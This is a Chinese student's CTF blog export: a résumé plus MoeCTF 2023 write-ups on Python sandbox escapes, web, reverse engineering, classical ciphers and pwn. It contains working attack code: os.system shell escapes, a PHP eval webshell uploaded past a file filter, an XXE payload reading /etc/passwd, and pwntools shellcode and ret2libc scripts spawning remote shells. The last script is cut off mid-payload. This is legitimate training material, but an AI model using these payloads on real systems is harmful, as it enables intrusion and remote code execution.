[{"url":"/2023/11/01/简历/","content":"主要的学习的方向是reverse\n\n语言方面：\nc，c++，python，java的基本用法，了解smali语法和汇编语言\n\n工具：\nIDA pro，jadx，jeb，adb，dbg，Exeinfo PE，dnspy，MT，NP的使用，pwntools，pwndbg，ROPgadget，one_gadget，seccomp-tools，LibcSearcher，patchelf，glibc-all-in-one\n\n知识：\nIDA远程以及本地动调，了解z3库的使用,了解.net逆向，C++逆向，安卓逆向，pyc-exe，脱壳中的upx壳，魔改upx壳，手脱中的单步脱壳以及esp脱壳定律，了解一些基本的花指令并且知道如何去掉，maze的做法，SMC的原理以及动调绕过，rc4加密，了解angr，了解tea，xtea，xxtea加密，小米刷机root，简易的frida hook，jeb动调，NP和MT配合其他模块修改APP数据\n\npwndbg动调程序，ELF文件的保护机制，栈的基本知识，Ret2txt，ret2shellcode，ret2syscall，ret2libc，ret2csu等return to 系列的攻击手法以及原理，Canary三种绕过方式，简易的PIE保护绕过，了解格式化字符串，栈迁移，花样栈溢出，堆溢出的入门基础知识\n\n最近一直再打，shctf，moectf，newstart，0xgame，极客大挑战，等比赛积累经验，代表学校参加科来杯，学校排名22，山东省省赛三等奖，入门大概半年，刚升入大二，开始的时候没有全身心地投入到里面，现在想加入战队学习更多的知识，结交一下各位师傅"},{"title":"moectf","url":"/2023/10/10/moectf/","content":"\n# Jail\n\n[[PyJail\\] python沙箱逃逸探究·总览（HNCTF题解） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/578966149)\n\n[Bypass Python sandboxes - HackTricks --- 绕过 Python 沙箱 - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)\n\n[CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12647#toc-23)\n\n## jail level 0\n\n第一次接触python沙盒，先了解一些基础的知识\n\n>  Hey Guys,I think maybe this is your first encounter with the Jail challenge.                                                                       \n>  Here is a brief description of the Jail challenge                                                                                                  \n>  >   Your commands and code will run in a restricted environment you need to find a way to bypass the restricted environment to get the flags       \n>\n>  Well, as you can see this challenge is a pyjail challenge and uses a menu where you can select functions based on relevant options.                \n>  For example, type g to get the source code of the challenge, e to enter the challenge, c to get the description of the challenge, q to exit         \n>  The following description is unique to the Challenge Description function of the terminal                                                          \n>                                                                                                                                                     \n>  I'm glad you understood the purpose of the menu and managed to get here, and I'm sure you've read the source code, but if you're not familiar          \n>  with python, I'd recommend checking out https://docs.python.org/3/ and https://www.runoob.com/python3/python3-tutorial.html first.                 \n>  The function of the code is probably that you can type in some arithmetic expression, like 1+1 and he'll give you 2 back.But your goal is to get   \n>  flag use it. \n\n这里推荐的网站是，很好用\n\n> [Bypass Python sandboxes - HackTricks --- 绕过 Python 沙箱 - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)\n\n做题目的过程就是首先先G，获取题目源代码，然后进行E进入挑战，成功绕过各种限制后就可以得到flag\n\n``` txt\n| Options: \n|\t[G]et Challenge Source Code \n|\t[E]nter into Challenge \n|\t[C]hallenge Description \n|\t[Q]uit \n```\n\n我们按G可以看到源码就是这样，没有任何限制\n\n``` python\nprint(\"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.\")\nprint(\"Enter your expression and I will evaluate it for you.\")\nuser_input_data = input(\"> \")\nprint('calc Answer: {}'.format(eval(user_input_data)))\n```\n\n但同样的，他没有执行我们命令的库，引用网站的第一句\n\nCommand Execution Libraries\n\n> The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:\n\n我们直接看源码是没有发现我们需要执行函数所需要的库的，那我们直接导入然后执行\n\n> __import__(\"os\").system(\"cat flag\")\n> flag{U45lmeD5YgYUy3VtI5Y0l1rJ-qYp9DCg}\n\n\n\n## jail level 1\n\n我们直接查看源码\n\n``` python\nprint(\"Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge.\")\nprint(\"Enter your expression and I will evaluate it for you.\")\nuser_input_data = input(\"> \")\nif len(user_input_data)>12:\n  print(\"Oh hacker! Bye~\")\n  exit(0)\nprint('calc Answer: {}'.format(eval(user_input_data)))\n```\n\n可以看到，他的限制就多了一条字节数不能大于12而已，那么我们可以使用\n\nbreakpoint()就会进到Pdb里面。\n\n> pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。\n\n只要我们进入了pdb模式，就可以进行一句话RCE了\n\n（还有一种方法是使用help() -> os -> !sh，但这个题目不行，不知道为什么）\n\n> breakpoint()\n>\n> __import__(\"os\").system(\"sh\")\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1t1vuf648xwg.webp)\n\n\n\n## jail level 2\n\n\n\n``` python\nprint(\"Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge.\")\nprint(\"Enter your expression and I will evaluate it for you.\")\nuser_input_data = input(\"> \")\nif len(user_input_data)>6:\n  print(\"Oh hacker! Bye~\")\n  exit(0)\nprint('calc Answer: {}'.format(eval(user_input_data)))\n\n```\n\n我们可以看到正好就用到了我们上一个挑战没用到的help（）方法\n\n> help() -> os -> !sh\n\n> help()\n> help> modules\n> help> antigravity\n> @ → /bin/sh\n> /bin/sh 1>&2\n> reset\n> cat .passwd\n\n使用help（）进入help的终端界面，就可以看到很多模块，我们选择os模块，然后在终端输入!sh就可以进入shell了，之后直接cat flag即可，我们顺便也可以看一下他的源代码\n\n``` python\n#!/usr/bin/env python3\nWELCOME = '''\n  __  __  ___        _____        _        _                _                         _                _ ___  \n |  \\/  |/ _ \\      / ____| ____ | |      | |              (_)                       | |              | |__ \\ \n | \\  / | | | | ___| |     / __ \\| | ___  | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| |  ) |\n | |\\/| | | | |/ _ \\ |    / / _` | |/ __| | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _ \\ \\ / / _ \\ | / / \n | |  | | |_| |  __/ |___| | (_| | | (__  | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\\ V /  __/ |/ /_ \n |_|  |_|\\___/ \\___|\\_____\\ \\__,_|_|\\___| |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_|    |_|\\___| \\_/ \\___|_|____|\n                           \\____/                      __/ |                                                  \n                                                      |___/                                                                                                                         \n'''\n\nCHALLENGE_SOURCE_CODE = '''\nprint(\"Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge.\")\nprint(\"Enter your expression and I will evaluate it for you.\")\nuser_input_data = input(\"> \")\nif len(user_input_data)>6:\n  print(\"Oh hacker! Bye~\")\n  exit(0)\nprint('calc Answer: {}'.format(eval(user_input_data)))\n'''\n\nCHALLENGE_DESCRIPT = '''\n\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\n|                                                                                                                                                    |\n| Hey Guys,I think maybe this is your first encounter with the Jail challenge.                                                                       |\n| Here is a brief description of the Jail challenge                                                                                                  |\n| >   Your commands and code will run in a restricted environment you need to find a way to bypass the restricted environment to get the flags       |\n|                                                                                                                                                    |\n| Well, as you can see this challenge is a pyjail challenge and uses a menu where you can select functions based on relevant options.                |\n| For example, type g to get the source code of the challenge, e to enter the challenge, c to get the description of the challenge, q to exit        | \n| The following description is unique to the Challenge Description function of the terminal                                                          |\n|                                                                                                                                                    |\n| I'm glad you understood the purpose of the menu and managed to get here, and I'm sure you've read the source code, but if you're not familiar      |    \n| with python, I'd recommend checking out https://docs.python.org/3/ and https://www.runoob.com/python3/python3-tutorial.html first.                 |\n| The function of the code is probably that you can type in some arithmetic expression, like 1+1 and he'll give you 2 back.But your goal is to get   |\n| flag use it.                                                                                                                                       |\n|                                                                                                                                                    |\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\n\n'''\n\nCHALLENGE_HINT_FOR_BEGINNER = '''\n\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\n|                                                                                                                                                    |\n| Hint for beginner:                                                                                                                                 |\n| 1. you need to find a payload not above 6 byte                                                                                                     |\n| 2. the docker file use socat. the EXEC arg is --> `EXEC:\"./xxxxxxx.py\",pty,......`                                                                 |\n|                                                                                                                                                    |\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\n\n'''\n\nprint(WELCOME)\nprint(\"| Options: \\n|\\t[G]et Challenge Source Code \\n|\\t[E]nter into Challenge \\n|\\t[C]hallenge Description \\n|\\t[Q]uit \\n\\t\")\nwhile(1):\n  choice = input(\">>> \").lower().strip()\n  if choice == 'g':\n      print(CHALLENGE_SOURCE_CODE)\n  elif choice == 'e':\n    print(\"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.\")\n    print(\"Enter your expression and I will evaluate it for you.\")\n    user_input_data = input(\"> \")\n    if len(user_input_data)>6:\n      print(\"Oh hacker! Bye~\")\n      exit(0)\n    print('Answer result: {}'.format(eval(user_input_data)))\n  elif choice == \"c\":\n    print(CHALLENGE_DESCRIPT)\n    user_input_hint_choice = input(\"If you still don't know how to solve it,do you need some hint? (y/n) > \").lower().strip()\n    if user_input_hint_choice == 'y':\n      print(CHALLENGE_HINT_FOR_BEGINNER)\n    if user_input_hint_choice == 'n':\n      print(\"Good luck!\")\n  elif choice == 'q':\n    print(\"bye~~~\")\n    quit()\n  else:\n    print(\"You should select valid choice!\")\n```\n\n## jail level 3\n\n``` python\n    import re\n    BANLIST = ['breakpoint']\n    BANLIST_WORDS = '|'.join(f'({WORD})' for WORD in BANLIST)\n    print(\"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.\")\n    print(\"Enter your expression and I will evaluate it for you.\")\n    user_input_data = input(\"> \")\n    if len(user_input_data)>12:\n      print(\"Oh hacker! Bye~\")\n      exit(0)\n    if re.findall(BANLIST_WORDS, user_input_data, re.I):\n      raise Exception('Blacklisted word detected! you are hacker!')\n    print('Answer result: {}'.format(eval(user_input_data)))\n\n```\n\n[CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12647#toc-23)\n\n相比较jail1多了一个breakpoint()的过滤，通过网上搜索，我们对于函数名可以使用**Unicode**进行绕过，数字可以使用***ord***绕过，当然如果他的限制大小是>13的话可以使用\n\n> eval(input())\n\n那么我们就可以对其中一个字符进行Unicode编码，然后传送到目标处\n\n> 输入法的全角输入就是unicode编码\n\n``` python\nbreakpｏint()\n__import__(\"os\").system(\"sh\")\n```\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1igtu8neq2m8.webp)\n\n\n\n## jail level 4\n\npython2的沙盒逃逸\n\npython2：input（） = python3：eavl（input（））\n\n直接一句话就行\n\n> __import__(\"os\").system(\"sh\")\n\n## jail level 5\n\n``` python\n    print(\"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.\")\n    print(\"Enter your expression and I will evaluate it for you.\")\n    def func_filter(s):\n      not_allowed = set('\"'`bid')\n      return any(c in not_allowed for c in s)\n    user_input_data = input(\"> \")\n    if func_filter(user_input_data):\n      print(\"Oh hacker! Bye~\")\n      exit(0)\n    if not user_input_data.isascii():\n      print(\"Sorry we only ascii for this chall!\")\n      exit(0)\n    print('Answer result: {}'.format(eval(user_input_data)))\n\n```\n\n\n\n\n\n## jail level 6\n\n\n\n``` python\n    print(\"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.\")\n    print(\"Enter your expression and I will evaluate it for you.\")\n    def func_filter(s):\n      not_allowed = set('\"'`bic+')\n      return any(c in not_allowed for c in s)\n    user_input_data = input(\"> \")\n    if func_filter(user_input_data):\n      print(\"Oh hacker! Bye~\")\n      exit(0)\n    if not user_input_data.isascii():\n      print(\"Sorry we only ascii for this chall!\")\n      exit(0)\n    print('Answer result: {}'.format(eval(user_input_data)))\n```\n\n\n\n## Leak Level 0\n\n> global ()和 locals ()函数\n>\n> 使用global ()可以获取Python中的全局变量；\n>\n> 使用locals ()可以获取Python中的局部变量；\n\n\n\n``` python\n    fake_key_into_local_but_valid_key_into_remote = \"moectfisbestctfhopeyoulikethat\"\n    print(\"Hey Guys,Welcome to the moeleak challenge.Have fun!.\")\n    print(\"| Options: \n|\t[V]uln \n|\t[B]ackdoor\")\n    def func_filter(s):\n      not_allowed = set('vvvveeee')\n      return any(c in not_allowed for c in s)\n    while(1):\n      challenge_choice = input(\">>> \").lower().strip()\n      if challenge_choice == 'v':\n        code = input(\"code >> \")\n        if(len(code)>9):\n          print(\"you're hacker!\")\n          exit(0)\n        if func_filter(code):\n          print(\"Oh hacker! byte~\")\n          exit(0)\n        print(eval(code))\n      elif challenge_choice == 'b':\n        print(\"Please enter the admin key\")\n        key = input(\"key >> \")\n        if(key == fake_key_into_local_but_valid_key_into_remote):\n          print(\"Hey Admin,please input your code:\")\n          code = input(\"backdoor >> \")\n          print(eval(code))\n      else:\n        print(\"You should select valid choice!\")\n\n```\n\n基础的泄露题，看到他限制了不能使用函数，且V函数里的code长度不能大于9，\n\n那么我们已知key是全局变量，那我们首先V然后使用global()函数找到真实的key，然后再用B函数进行一句话RCE\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3xkm16wsss20.png)\n\n\n\n## Leak Level 1\n\n``` python\n    fake_key_into_local_but_valid_key_into_remote = \"moectfisbestctfhopeyoulikethat\"\n    print(\"Hey Guys,Welcome to the moeleak challenge.Have fun!.\")\n    def func_filter(s):\n      not_allowed = set('moe_dbt')\n      return any(c in not_allowed for c in s)\n    print(\"| Options: \n|\t[V]uln \n|\t[B]ackdoor\")\n    while(1):\n      challenge_choice = input(\">>> \").lower().strip()\n      if challenge_choice == 'v':\n        code = input(\"code >> \")\n        if(len(code)>6):\n          print(\"you're hacker!\")\n          exit(0)\n        if func_filter(code):\n          print(\"Oh hacker! byte~\")\n          exit(0)\n        print(eval(code))\n      elif challenge_choice == 'b':\n        print(\"Please enter the admin key\")\n        key = input(\"key >> \")\n        if(key == fake_key_into_local_but_vailed_key_into_remote):\n          print(\"Hey Admin,please input your code:\")\n          code = input(\"backdoor >> \")\n          print(eval(code))\n      else:\n        print(\"You should select valid choice!\")\n\n```\n\n我们可以看到第一个限制长度变成了6，而且还是有函数过滤，那么我还是使用unicode编码的方式绕过过滤\n\n> 输入法的全角输入就是unicode编码\n\n我们使用unicode编码输入一个help()，函数，然后输入\\__main__，查看全局变量\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4kgd10c9cmc0.webp)\n\n得到正常的key就可以去愉快的一句话RCE了\n\n\n\n## Leak Level 2\n\n和leak1一样的，没过滤help(),直接使用help（）获取key然后获取flag\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.39u5399sj2k0.webp)\n\n\n\n\n\n\n\n# AI\n\n[pytorch超详细安装教程，Anaconda、PyTorch和PyCharm整套安装流程_pytorch安装-CSDN博客](https://blog.csdn.net/Bluebro/article/details/127161165)\n\n安装了环境，但东西很新，目前没有很多精力，以后再说\n\n\n\n\n\n# RE\n\n## RUST\n\n第一次接触rust逆向，安装环境安装了好久，最后发现还是GPT好用\n\n我们需要安装一个rust的IDA插件，那样会更加直观：IDARustDemangler\n\n首先下载这个插件前我们需要有RUST环境，有了RUST环境后就可以使用cargo进行编译rs-dml，运行起IDARustDemangler.py\n\n这里放上两个链接，可以自行下载\n\n[timetravelthree/IDARustDemangler: Rust Demangler & Normalizer plugin for IDA (github.com)](https://github.com/timetravelthree/IDARustDemangler)\n\n[安装 Rust - Rust 程序设计语言 (rust-lang.org)](https://www.rust-lang.org/zh-CN/tools/install)\n\n我安装时的误会，安装完成RUST后，rs-dml会让你执行\n\ncargo build --xxxxx\n\n这个其实是rs-dml github上的，下载下来后，在那个目录执行那个命令就可以，记得最后要把编译出来的rs-dml添加到环境变量中去\n\n可以看一下没用插件和用插件之前的区别,很明显他会帮你解散 Rust 函数名称并将其规范化\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4fn9frtsv1u0.png)\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3h3ka2vwfmw0.webp)\n\n那么我进行分析就简单了很多，但rust不愧是最安全的语言，基本也看不懂，最后我们在这里发现了异样，他对一个数据进行0x88异或，那么前面正好也有一个数据块，我们猜测既然是异或，那么a=b^c，那么c=a^b，所以我们直接写脚本进行解密即可\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.epnkcgdi1lk.webp)\n\n``` python\na=[-27, -25, -19, -21, -4, -18, -13, -38, -3, -5, -4, -41, -6, -19, -2, -41, -1, -31, -28, -28, -41, -22, -19, -41, -23, -1, -18, -3, -71, -11]\n\nfor i in range(len(a)):\n    a[i]^=0x88\n    print(chr(a[i]%256),end='')\n```\n\n\n\n# web\n\n## http\n\n1.use parameter: UwU=u\n2.post **form**: Luv=u\n3.use admin character\n4.request from 127.0.0.1\n5.use browser 'MoeBrowser'\n\n第一个条件和第二个条件直接在hackbar传参，第二个是修改cookie的值，第四个是由本地传输，最后一个是指定浏览器\n\nX-Forwarded-For: 127.0.0.1\nuser-agent:MoeBrowser\nCookie: character=admin\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3mxe1lqm8780.webp)\n\n\n\n## 彼岸的flag\n\n直接去源码cttl+f 查找moectf即可\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2b4by3jjufa.png)\n\n\n\n## cookie\n\n一些api说明\n\n注册 `POST /register`\n\n```json\n{\n    \"username\":\"koito\",\n    \"password\":\"123456\"\n}\n```\n\n登录 `POST /login`\n\n```json\n{\n    \"username\":\"koito\",\n    \"password\":\"123456\"\n}\n```\n\n获取flag `GET /flag`\n\n查询服务状态 `GET /status`\n\n\n\n根据他的提示我们得知，他是先让我们注册，然后登陆上去，登录后可以看可以看到flag的地方\n\n\n\n谷歌的hackbar可以直接解析json的数据，然后post传输过去\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4l3ehlj1qrs0.webp)\n\n传输过去后我们就已经注册成功了\n\n\n\n## gas!gas!gas!\n\n\n\n``` python\nimport requests\nimport time\nsession = requests.session()\nresTest = '弯道直行，保持这个速度'\nfor x in range(1, 10):\n    # resTest = '弯道直行，保持这个速度'\n    # fx = {-1:'左',0:'直行',1:'右'}\n    # ym = {0:'松开',1:'保持',2:'全开'}\n    url = 'http://localhost:62655/'\n    if \"太大\" in resTest:\n        ym = 2\n    elif \"太小\" in resTest:\n        ym = 0\n    else:\n        ym = 1\n    if \"向左\" in resTest:\n        fx = 1\n    elif \"向右\" in resTest:\n        fx = -1\n    else:\n        fx = 0\n\n    myData = {  # 构造的POST数据\n        \"driver\": \"11\",\n        \"steering_control\": fx,\n        \"throttle\": ym\n    }\n    # 发送 POST 请求\n    response = session.post(url, data=myData)\n    content = response.text\n    # 找寻指定字符串\n    start_index = content.find('<font color=\"red\">')\n    end_index = content.find(\"</font></h3></div>\", start_index)\n    if start_index != -1 and end_index != -1:\n        resTest = content[start_index + len('<font color=\"red\">'):end_index].strip()\n        print(resTest)\n        # print(response.text)\n    else:\n        print('未找到指定的字符串')\n        print(response.text)\n    print(\"会话数据：\", session.cookies.get_dict())\n    time.sleep(0.5)\n    # session.cookies.get_dict()可以用于获取当前会话对象中的 cookies 数据，返回一个字典形式的 cookies 数据。\n# print(response.text)\nsession.close()\n```\n\n\n\n## moe图床\n\n经典的文件上传\n\n编写一个一句话木马文件，上传到对方的服务器，我们就可以使用蚁剑进行连接对面的后门\n\n``` php\nGIF89a\n<?=eval($_POST['1']);?>\n```\n\n我们观察他的源代码，发现他只能上传后缀为png的文件，那我们就把这个文件后缀改为png，然后上传到对方的电脑，但一句话木马通常是php源码的格式，我们要执行他只能上传一个php后缀，所以我们在上传的时候，可以用burp进行抓包，然后修改他的后缀名，直接修改后缀名我们发现他是不可以传到对面的服务器的，那我们就在png的后面直接加上php后缀即可\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6cm88qnam5o0.png)\n\n我们上传成功后就能看到他还贴心的给了我们地址，那么我直接蚁剑连接即可\n\n可以在更目录发现flag\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.xy90ifuyfn4.webp)\n\n\n\n## 了解你的座驾\n\n[浅谈 XXE 漏洞任意文件读取_java xxe读取任意文件-CSDN博客](https://blog.csdn.net/fengzilin1973/article/details/116355031)\n\n我们抓包发现了xml，那么我们猜测就是xxe漏洞，直接上网找wp\n\n任意文件读取\n\n``` php\n<?xml version=\"1.0\" encoding=\"utf-8\"?>  \n\n<!DOCTYPE xxe [ \n<!ELEMENT name ANY > \n<!ENTITY xxe SYSTEM \"file:etc/passwd\" >]> \n<root> \n<name>&xxe;</name> \n</root> \n```\n\n我们直接发包的时候发现是不可以，我们需要进行一下url编码才可以\n\nburp里的情况\n\n``` python\nxml_content=<!DOCTYPE xxe [ \n<!ELEMENT name ANY > \n<!ENTITY xxe SYSTEM \"file:etc/passwd\" >]> \n<root> \n<name>&xxe;</name> \n</root>\n```\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.539slc36hjk0.webp)\n\n\n\n## 大海捞针\n\n直接扫码器burp爆破\n\n我们可以先用？id=1/2/3去看看这写页面都是什么，那么我们使用burp进行抓包就可以了\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.rcgjxlmdfxc.webp)\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.156e4evvp0dc.webp)\n\n\n\n## meo图床\n\n题目其实骗人的，真正的考点是目录穿越，我们可以以etc/passwd进行查证\n\n我们先随意上传一个文件，他会让我们进行查看\n\n我们成功找到了穿越的地点\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6yf32v4l2k80.webp)\n\n\n\n然后我们在直接去访问flag，他提供了一个php文件，我们直接访问\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.66dmrtb4xdo0.webp)\n\n最后我们进行一下简单的md弱比较，就可以了\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7kikqsr971g0.webp)\n\n\n\n## 夺命十三枪\n\nphp反序列化字符串逃逸\n\n\n\n\n\n\n\n# Crypto\n\n\n\n\n\n\n\n# Classical Crypto\n\n## ezrot\n\nrot47解密\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.75dyzhgenmc0.webp)\n\n\n\n## 可可的新围墙\n\n栅栏密码，栏数为3\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2ban0s7byzrw.webp)\n\n\n\n## 皇帝的新密码\n\n凯撒偏移为7\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.35v9q3am0wo0.webp)\n\n\n\n## 不是“皇帝的新密码”\n\n\n\n这个形式一看就是凯撒或者维吉尼亚，不是凯撒就是维吉尼亚了\n\n我们先把密钥设置成moectf，解出开头goodjo的字符串\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.68bfyu9qv240.webp)\n\n所以我们猜测密钥是goodjob\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.710x6km40ns0.webp)\n\n\n\n## 猫言喵语\n\nhit：Morse code\n\n喵喵？为长码，喵喵喵为短码直接解密即可\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1y2yk0m3v0v4.webp)\n\n# pwn\n\n## shellcode_level1\n\n我们checksec发现保护全开，然后看他的题目描述是关于mmap和mprotect函数的，分析源码可以看到有两处关键的信息\n\n> addr = mmap(0LL, 0x64uLL, 3, 34, -1, 0LL);\n\n> mprotect(addr, 0x1000uLL, 7);\n\n第二局的意思就是在这个以addr这个地址开始，0x1000字节的地址都是可读可写可执行的，然后他是在case4里的，那么就好办了，我们选择case4后直接传入shellcode就可以了\n\n``` python\nfrom pwn import *\n# p = process('./ezshellcode')\np = remote('....',55357)\ncontext(arch='amd64', os='linux')\ncontext.log_level = 'DEBUG'\nshellcode = asm(shellcraft.sh()) #生成并汇编shellcode\ntarget = 0x66660000\npayload = shellcode\np.recvuntil(b'choose?')\np.sendline(b'4')\np.sendline(payload)\np.interactive()\n```\n\n### uninitialized_key\n\n我们可以看到内存分布，v2就在v1下面，那我们输入第一个函数就可以了，\n\n第二个传一个空值\n\n``` python\nfrom pwn import *\n# p = process('./ezshellcode')\np = remote('....',58343)\ncontext(arch='amd64', os='linux')\ncontext.log_level = 'DEBUG'\np.recvuntil(b'age:')\np.sendline(b'114514')\np.recvline()\np.recvuntil(b'key:')\np.sendline(b'\\x00')\np.recvline()\np.interactive()\n```\n\n\n\n## format_level0\n\n\n\n``` python\na@a:~/tools$ nc localhost 58495\nPlease input your name:\naaaaaaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\nYour name is: aaaaaaaaaaaa.0xffbfeb7c.0x50.0x5663c362.0xffbfeca4.(nil).0x3.0x63656f6d.0x6b7b6674.0x37375254.0x5a5a7268.0x5a346d64.0x44337530.0x78786e2d.0x42566d59.0x77497752.0x7d65596f.0xa.(nil).(nil).(nil).(nil).(nil).\n\n```\n\n看到这些数据，将这些数据提取出来，然后去解码就能拿到flag，我们借用一个脚本一键做到\n\n ``` python\n from pwn import *\n # p = process('./ezshellcode')\n # p = remote('....',58343)\n context(arch='amd64', os='linux')\n context.log_level = 'DEBUG'\n flag=\"\"\n \n for i in range(7,17):\n     p = remote('10.241.180.67',58495)\n     p.sendline(f\"%{i}$p\")\n     p.recvuntil(\"0x\")\n \n     byte_str = binascii.unhexlify(p.recvline()[:-1])\n     str_result = byte_str.decode(\"utf-8\")\n     flag+=str_result[::-1]\n \n     p.close()\n \n print(flag)\n p.interactive()\n ```\n\n\n\n## PIE_enabled\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## ret2libc\n\n模板套题，有点小问题是他用ubuntu22.04打不通，但用18.04可以打通\n\n``` python\nfrom pwn import *\nfrom LibcSearcher import *\n\ncontext.log_level = 'debug'\n\np = remote('10.241.180.67',62836)\n\n#p = process('./stack1')\n\nelf = ELF('./pwn')\n\ngot_addr = elf.got['puts']\n\nplt_addr = elf.plt['puts']\n\nmain_addr = elf.symbols['main']\n\npop_rdi = 0x000000000040117e\n\npop_rsi_r15 = 0x00000000004006e1\n\npayload = (0x50+8)*b'a' + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)\n# print(payload)\n\np.sendline(payload)\n\n# p.recvline()\n\nputs_addr=u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) #将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，\n# leak = u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\"))\n\nprint(hex(puts_addr))\n\nlibc = LibcSearcher(\"puts\",puts_addr)\n\nlibcsase = puts_addr - libc.dump(\"puts\") \n\nsystem_addr = libcsase + libc.dump(\"system\")\n\nbinsh_addr = libcsase + libc.dump(\"str_bin_sh\")\n\nret_addr = 0x000000000040101a\n\npayload2 = (0x50+8)*b'a' + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\n\np.sendline(payload2)\n\np.interactive()\n```\n\n\n\n\n\n\n\n### pwn（03）\n\n分析源码，没有发现binsh字符串以及system函数，且开启了nx保护，看到pwnme（）函数中存在栈溢出，所以可以使用libc，具体思路为先泄露puts函数的真实地址，然后使用puts的真实地址确实libc版本，使用libcsearcher确定偏移等，最后或许shell\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\n\n\ncontext.log_level = 'debug'\n\n\np = remote(\"pwn.challenge.ctf.show\",28109)\n\n\n#p = process('./stack1')\n\n\nelf = ELF('./stack1')\n\n\ngot_addr = elf.got['puts']\n\n\nplt_addr = elf.plt['puts']\n\n\nmain_addr = elf.symbols['main']\n\n\npayload = b'a'*13 + p32(plt_addr) + p32(main_addr) + p32(got_addr)\n\n\np.sendline(payload)\n\n\np.recvuntil('\\n\\n')\n\n\nputs_addr = u32(p.recv(4))\n\n\nprint(hex(puts_addr))\n\n\nlibc = LibcSearcher(\"puts\",puts_addr)\n\n\nlibcsase = puts_addr - libc.dump(\"puts\") \n\n\nsystem_addr = libcsase + libc.dump(\"system\")\n\n\nbinsh_addr = libcsase + libc.dump(\"str_bin_sh\")\n\n\npayload2 = b'a'*13 + p32(system_addr) + b'aaaa' 